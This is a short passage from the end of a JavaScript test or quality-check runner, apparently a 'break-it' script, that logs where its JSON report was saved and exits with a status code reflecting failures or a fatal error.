  console.log(`\n${COLORS.d}Report saved → quality/results/break-it-report.json${COLORS.x}`);

  process.exit(fail_ > 0 ? 1 : 0);
})().catch(e => { console.error('FATAL', e); process.exit(2); });
